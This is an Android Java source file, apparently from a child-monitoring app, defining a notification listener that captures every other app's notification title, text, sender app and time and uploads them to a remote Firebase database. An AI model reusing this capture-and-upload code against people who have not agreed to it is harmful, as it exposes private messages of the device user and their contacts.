package com.kidsguard.child;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;
import org.json.JSONObject;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
public class NotificationCaptureService extends NotificationListenerService {
    private final ExecutorService io = Executors.newSingleThreadExecutor();
    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        if (sbn == null || sbn.getNotification() == null) return;
        if (sbn.getPackageName().equals(getPackageName())) return;
        io.execute(() -> {
            try {
                CharSequence t = sbn.getNotification().extras.getCharSequence("android.title");
                CharSequence tx = sbn.getNotification().extras.getCharSequence("android.text");
                JSONObject o = new JSONObject();
                o.put("app", sbn.getPackageName());
                o.put("title", t != null ? t.toString() : "");
                o.put("text", tx != null ? tx.toString() : "");
                o.put("time", sbn.getPostTime());
                FirebaseHelper.put("devices/" + LocationService.getSafeDeviceId(this) + "/notifs.json", o.toString());
            } catch (Exception e) { Log.e("Notif", "Parse fail", e); }
        });
    }
    @Override public void onDestroy() { io.shutdownNow(); super.onDestroy(); }
}
